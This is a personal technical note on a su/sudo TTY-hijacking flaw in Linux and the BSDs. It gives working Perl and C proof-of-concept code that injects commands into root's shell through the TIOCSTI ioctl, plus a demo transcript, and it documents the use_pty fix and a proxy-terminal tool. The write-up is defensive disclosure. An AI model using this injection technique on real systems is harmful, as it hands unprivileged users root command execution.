
##
#
https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking
#
##

su/sudo from root to another user allows TTY hijacking and arbitrary code execution
First written 2016-10-17; Last updated 2023-03-16

back

TL;DR: Don’t run su - $USER or sudo -u $USER (unless use_pty is set) as root or $USER may inject arbitrary commands in your root shell. At least Linux, OpenBSD and FreeBSD are affected. This is not an issue when su-ing to root.

Update (2023-03-16): Even without TIOCSTI Linux virtual terminals (/dev/tty*) are still vulnerable to a similar attack using TIOCLINUX as reported by Jakub Wilk on oss-security (PoC ttyjack).

Update (2023-01-21): Linux 6.2 will add the sysctl legacy_tiocsti and build option LEGACY_TIOCSTI to globally disable TIOCSTI (default is still enabled).

Update (2021-10-05): OpenBSD removed TIOCSTI in OpenBSD 6.2 making it no longer vulnerable. Linux and FreeBSD are still vulnerable.

I regularly ran su - $USER to administrate non-privileged accounts (which often have no login shell nor password and thus SSH is no option) and debug issues. Although su-ing to other accounts may be considered bad practice by some it makes administration much more pleasant and thus motivates me to separate many tasks in a special user, creating users with only minimal access and good separation.

However I wasn’t aware that running su - $USER or sudo -u $USER allows $USER to inject arbitrary commands in my shell (running as root) and thus execute arbitrary commands. This was first reported (to my knowledge) for su in 2005 on the RedHat bug tracker, but only fixed for su -c. Debian has (as of October 2021) an open bug for su (#628843). Only su -c is fixed in Debian Jessie and later. The bug for sudo (#657784) (open since 2011) was closed in April 2021 by using use_pty in the default sudoers (see below). However, this doesn’t fix existing installations! Non-Linux systems are affected as well: The exploit below works on at least OpenBSD 6.0 and 6.1 (doas is affected as well; 6.2 and later are no longer affected) and FreeBSD 11 and later (last tested 13.0-RELEASE-p4).

There is an easy fix for sudo which is as of now not enabled by default. Add use_pty to /etc/sudoers (see below how this works):

# Prevent arbitrary code execution as your user when sudoing to another
# user due to TTY hijacking via TIOCSTI ioctl.
Defaults use_pty
Exploit
A very simple exploit was posted by Ismaël RUAU in #628843:

#!/usr/bin/perl
require "sys/ioctl.ph";
open my $tty_fh, '<', '/dev/tty' or die $!;
foreach my $c (split //, "exit\n".'echo Payload as $(whoami)'.$/) {
    ioctl($tty_fh, &TIOCSTI, $c);
}
The exploit doesn’t work on some systems. The following C version should work everywhere:

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "exit\necho Payload as `whoami`\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
To see if you’re affected run su -s /bin/sh nobody and then run the exploit; if you see “Payload as root” then you’re affected (only /tmp/exploit is user input, the following output is caused by the exploit):

# id -u
0
# su -s /bin/sh - nobody
No directory, logging in with HOME=/
$ /tmp/exploit
exit
echo Payload as $(whoami)
$ # echo Payload as $(whoami)
Payload as root
#
Details
The problem with su and sudo is that although they change the UID of the executed process to the non-root user, the (pseudo) terminal is still that of the root user and thus accessible to the non-privileged user. The current terminal of a program is always accessible through /dev/tty. By opening this device as non-root user and then using the TIOCSTI ioctl(2) to fake user input on that terminal, the user can inject commands in the terminal. In the example exploit above first the shell running as the user is terminated (exit) and then the payload is written. After the user’s shell quits, the shell running as root reads the faked user input and executes it. There is no race condition as the input is stored in the terminal’s buffer waiting to be read.

As the original problem is access to root terminal, the fix is to allocate a new pseudo-terminal and to proxy all input from the user’s pseudo terminal to root’s terminal. An attacker can no longer issue the TIOCSTI to root’s terminal and thus no longer fake any input. sudo's use_pty does exactly that.

The implementation of such a proxy is not trivial as it requires (“arcane”) knowledge about terminals, session leaders, (fore-/background) process groups, controlling terminals, etc. Writing ptyas (see below) was a great learning experience for me and helped me understand UNIX terminals better. For more details about UNIX (pseudo) terminals read “The TTY demystified”.

Note however that even with this fix other attacks are still possible as the non-privileged user still generates output which is interpreted by the local terminal (emulator). If the terminal (emulator) has vulnerabilities (e.g. through unexpected escape codes) they can be triggered and possibly exploited by the non-privileged user. If possible, non-privileged users should never have access to a (pseudo) terminal of a more privileged user.

ptyas
ptyas is a minimal reimplementation of su which uses a proxy pseudo terminal as explained above to prevent this issue. It can only run as root and will either spawn the user’s default shell or run the given command. It has no advantages over sudo with the use_pty option, but it’s less complex and doesn’t require another setuid binary on the system. ptyas is written in C99 and should run on most POSIX systems which also provide ppoll(). Tested on Linux, OpenBSD and FreeBSD. Feedback is welcome.

back

Last updated 2023-03-16

Impressum Datenschutzerklärung
